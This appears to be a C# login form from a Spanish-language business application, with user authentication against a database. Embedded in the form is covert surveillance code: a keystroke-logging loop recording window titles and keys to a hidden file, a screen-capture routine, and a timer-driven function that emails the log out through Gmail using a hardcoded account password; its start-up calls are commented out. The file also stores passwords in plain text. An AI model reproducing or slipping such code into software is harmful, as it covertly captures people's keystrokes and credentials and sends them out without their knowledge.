using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using SIT.Views;
using System.Net.Mime;
using System.Drawing.Imaging;

namespace SIT
{
    public partial class Login : Form
    {
        public Login()
        {
            InitializeComponent();
        }

        Usuarios usuarios = new Usuarios();


        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr ventana, StringBuilder cadena, int cantidad);
        string nombre1 = string.Empty;
        string nombre2 = string.Empty;



        private void CargarKeyLogger()
        {
            while (true)
            {
                const int limite = 256; // Declaramos un entero constante con valor de 256
                StringBuilder buffer = new StringBuilder(limite); // Declaramos un StringBuilder en buffer usando el int limite
                IntPtr manager = GetForegroundWindow(); // Declaramos manager como IntPtr usando GetForegroundWindow para poder

                if (GetWindowText(manager, buffer, limite) > 0) // Obtenemos el nombre de la ventana y lo almacenamos en buffer
                {
                    nombre1 = buffer.ToString(); // Almacenamos el nombre de la ventana en nombre1

                    if (nombre1 != nombre2) // Si nombre1 y nombre2 no son iguales ...
                    {
                        nombre2 = nombre1; // nombre2 tendra el valor de nombre1
                        savefile(System.Environment.NewLine + DateTime.Now.ToString() + "//" + Environment.MachineName.ToString() + "[" + nombre2 + "]" + ": "); // Agregamos el nombre de la ventana en el archivo de texto
                    }
                }




                for (int num = 0; num <= 255; num++) // Usamos el int num para recorrer los numeros desde el 0 al 255
                {
                    int numcontrol = GetAsyncKeyState(num);  // Usamos GetAsyncKeyState para verificar si una tecla fue presionada usando el int numcontrol  
                    if (numcontrol == -32767) // Verificamos si numcontrol fue realmente presionado controlando que numcontrol sea -32767  
                    {
                        if (num >= 65 && num <= 122) // Si el int num esta entre 65 y 122 ...
                        {
                            if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                            {
                                // Si se detecta Shift y CapsLock ...
                                string letra = Convert.ToChar(num + 32).ToString(); // Le sumamos 32 a num y la convertimos a Char para formar la letra minuscula
                                savefile(letra); // Agregamos la letra al archivo de texto
                            }
                            else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                            {
                                // Si se detecta Shift o CapsLock
                                string letra = Convert.ToChar(num).ToString(); // Formamos la letra convirtiendo num a Char
                                savefile(letra); // Agregamos la letra al archivo de texto
                            }
                            else if (Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                            {
                                // Si se detecta CapsLock ...
                                string letra = Convert.ToChar(num).ToString(); // Formamos la letra convirtiendo num a Char
                                savefile(letra); // Agregamos la letra al archivo de texto

                            }
                            else
                            {
                                // Si no se detecta ni Shift ni CapsLock ... 
                                string letra = Convert.ToChar(num + 32).ToString(); // Formamos la letra minuscula sumandole 32 a num y convirtiendo num a Char
                                savefile(letra); // Agregamos la letra al archivo de texto
                            }
                        }

                    }
                }

            }

        }

        private void ScreenShoot(string nombre)
        {
            try
            {

                int wid = Screen.GetBounds(new Point(0, 0)).Width; // Declaramos el int wid para calcular el tamaño de la pantalla
                int he = Screen.GetBounds(new Point(0, 0)).Height; // Declaramos el int he para calcular el tamaño de la pantalla
                Bitmap now = new Bitmap(wid, he); // Declaramos now como Bitmap con los tamaños de la pantalla
                Graphics grafico = Graphics.FromImage((Image)now); // Declaramos grafico como Graphics usando el declarado now 
                grafico.CopyFromScreen(0, 0, 0, 0, new Size(wid, he)); // Copiamos el screenshot con los tamaños de la pantalla 
                // usando "grafico"
                now.Save(nombre, ImageFormat.Jpeg); // Guardamos el screenshot con el nombre establecido en la funcion
            }
            catch
            {
                //
            }
        }

        private void savefile(string texto)
        {
            //Function savefile() Coded By Doddy Hackman
            try
            {
                string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

                if (!Directory.Exists(filepath))
                {
                    Directory.CreateDirectory(filepath);
                }

                string path = (filepath + @"\keystrokes.txt");

                if (!File.Exists(path))
                {
                    using (StreamWriter sw = File.CreateText(path))
                    {

                    }
                }

                using (StreamWriter sw = File.AppendText(path))
                {
                    sw.Write(texto);
                    sw.Close();
                }
            }
            catch
            {
                //
            }
        }

        public void EnviarArchivo()
        {
            String folderName= Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string filepath = folderName + @"\keystrokes.txt";
            String logcontents= File.ReadAllText(filepath);
            string subject = "Message from " + Environment.MachineName.ToString();

            Attachment attachment = new Attachment(filepath, MediaTypeNames.Application.Pdf);

            // Sender's email and password
            string senderEmail = "facturaciontdavila@gmail.com";
            string senderPassword = "gfmpvpuudivhmzwv";

            // Recipient's email address
            string recipientEmail = "sistemas@transportesdavila.com.mx";

            string fecha = DateTime.Now.ToString("h:mm:ss tt"); // Obtemos la hora actual usando DateTime y la guardamos en la 
                                                                // variable string con el nombre de fecha
            string nombrefinal = fecha.Trim() + ".jpg"; // Limpiamos la variable fecha de los espacios en blanco y le agregamos
                                                        // ".jpg" al final para terminar de generar el nombre de la imagen
            string final = nombrefinal.Replace(":", "_"); // Reemplazamos los ":" de la hora por "_" para que no haya problemas
                                                          // al crear la imagen
            ScreenShoot(final); // Usamos la funcion screenshot() para mandar el nombre de la imagen que tiene la variable "final"
                                // y asi realizar el screenshot


            // Create the email message
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress(senderEmail);
            mailMessage.To.Add(recipientEmail);
            mailMessage.Subject = subject;
            mailMessage.Body = subject;
            mailMessage.Attachments.Add(attachment);


            // Configure the SMTP client
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
            smtpClient.Port = 587;
            smtpClient.Credentials = new NetworkCredential(senderEmail, senderPassword);
            smtpClient.EnableSsl = true;


            try
            {
                // Send the email
                smtpClient.Send(mailMessage);
                Console.WriteLine("Email sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending email: {ex.Message}");
            }
            finally
            {
                attachment.Dispose();
            }
        }

        private void btnlogin_Click(object sender, EventArgs e)
        {
            IniciarSesion();
        }

        private void IniciarSesion()
        {
            if (this.txt_user.Text == "")
            {
                MessageBox.Show("Favor de capturar el usuario");
            }
            else if (this.txt_password.Text == "")
            {
                MessageBox.Show("Favor de capturar la contraseña");
            }
            else
            {

                using (var ctx = new SITEntities())
                {
                    usuarios = ctx.Usuarios
                                    .Where(s => s.Usuario == this.txt_user.Text && s.Password == this.txt_password.Text)
                                    .FirstOrDefault<Usuarios>();
                    if (usuarios != null)
                    {
                        this.Hide();

                        if(this.chk_sesion.Checked==true)
                        {
                            Properties.Settings.Default.usuario=this.txt_user.Text;
                            Properties.Settings.Default.password=this.txt_password.Text;
                            Properties.Settings.Default.Save();
                        }
                        
                        Menus frm = new Menus(this);
                        frm.usuariologin = usuarios;
                        frm.Show();
                    }
                    else if (usuarios.IdEstatus != 1)
                    {
                        MessageBox.Show("Usuario Inactivo");
                    }
                    else
                    {
                        MessageBox.Show("Favor de validar usuario y/o contraseña");
                    }
                }
            }
        }

        private void Login_Load(object sender, EventArgs e)
        {
            //Thread workerThread = new Thread(new ThreadStart(CargarKeyLogger));
            //workerThread.Start();

            //timer.Start();
            CargarDatosUsuario();


        }

        private void timer_Tick(object sender, EventArgs e)
        {
            EnviarArchivo();
        }

        private void CargarDatosUsuario()
        {
            if(Properties.Settings.Default.usuario!="" && Properties.Settings.Default.password != "")
            {
                this.txt_user.Text = Properties.Settings.Default.usuario;
                this.txt_password.Text = Properties.Settings.Default.password;
            }
        }
    }
}
